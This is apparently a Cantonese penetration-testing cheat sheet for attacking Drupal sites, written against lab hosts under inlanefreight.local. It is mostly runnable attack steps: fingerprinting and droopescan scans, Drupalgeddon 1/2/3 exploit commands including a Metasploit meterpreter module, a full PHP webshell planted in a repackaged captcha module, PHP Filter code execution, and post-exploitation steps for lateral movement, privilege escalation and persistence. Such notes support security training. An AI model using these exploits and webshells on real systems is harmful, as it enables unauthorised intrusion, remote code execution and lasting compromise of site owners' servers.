# Drupal

## <mark style="color:red;">**1. 發現點**</mark>

* 網站係 **Drupal 8**（或者有舊版 Drupal 存在）。
* 檢查 `CHANGELOG.txt` 或者用 `droopescan` 可以知道確實用緊邊個版本。
* 如果係舊版（Drupal 7.x 或 Drupal 8.5.1 以下），**高危漏洞機率極大**！

## <mark style="color:red;">**2. 測試Payload**</mark>

#### 1️⃣ 驗證目標用咩CMS：

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```

> 出現 `<meta name="Generator" content="Drupal 8 ...">` 代表用緊Drupal。

#### 2️⃣ 確認版本：

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt | head -n 5
```

> 如果係 8.5.1 或以下、7.58 或以下，**高危漏洞**。

#### 3️⃣ 自動掃描

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

> 自動列出版本、已知漏洞、開放模組。

## <mark style="color:red;">3. 利用階段</mark>

#### （A）Drupalgeddon1 — CVE-2014-3704（SQL Injection）

* 目標：<mark style="color:purple;">**直接創建 admin**</mark>
* 方法：

```bash
python2 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

> 完成後可以用 `hacker : pwnd` 帳號登入。

***

#### （B）Drupalgeddon2 — CVE-2018-7600（RCE）

* 功能：<mark style="color:purple;">未登入情況直接RCE</mark>
* 工具：

```sh
python3 drupalgeddon2.py
```

* 會提示輸入 URL，例如：

```sh
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
```

* 成功會上傳一個 `hello.txt` 或 `mrb3n.php`
* 確認 webshell：

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

> 看到 `uid=33(www-data)` 就成功咗！

***

#### （C）Drupalgeddon3 — CVE-2018-7602（需登入）

* <mark style="color:purple;">如果已經有 admin 權限，可以用 Metasploit：</mark>

```sh
use exploit/multi/http/drupal_drupageddon3
set rhosts <target_ip>
set VHOST drupal-acc.inlanefreight.local
set drupal_session <有效session>
set LHOST <你的IP>
set DRUPAL_NODE 1
exploit
```

> 會開一個 meterpreter session！

\
\
\


## <mark style="color:red;">4. 上傳後門模組（如果有 admin）</mark>

1. 去 drupal.org 下載 `captcha` 模組：

```bash
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

2. 在 captcha 資料夾入面建立一個 webshell： `shell.php`

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

3. 建立 `.htaccess`：

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

4. 將 shell.php 同 .htaccess 放入 captcha 文件夾，再打包：

```bash
tar cvf captcha.tar.gz captcha/
```

5. 管理後台上傳 `captcha.tar.gz`：

```
http://drupal.inlanefreight.local/admin/modules/install
```

6. 安裝完成後存取 shell：

```bash
curl http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## <mark style="color:red;">5.PHP Filter 利用（只限 Drupal 7 或早期 8）</mark>

1. 登入 admin
2. Enable 「PHP Filter」模組
3. 去「內容」>「新增內容」> 「Basic page」
4. 內容輸入：

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

5. Text format 選「PHP code」，儲存
6. 通過：

```
http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

> 即可RCE。

\
\


## <mark style="color:red;">6. 連鎖漏洞</mark>

1. 橫向移動
   * 確認 server 內部其他主機
   * 用 `netstat -anp`、`arp -a`
2. 嘗試提權
   * `sudo -l`
   * `find / -perm -4000 -type f 2>/dev/null`
3. 擴大後門
   * 放置持久化 shell

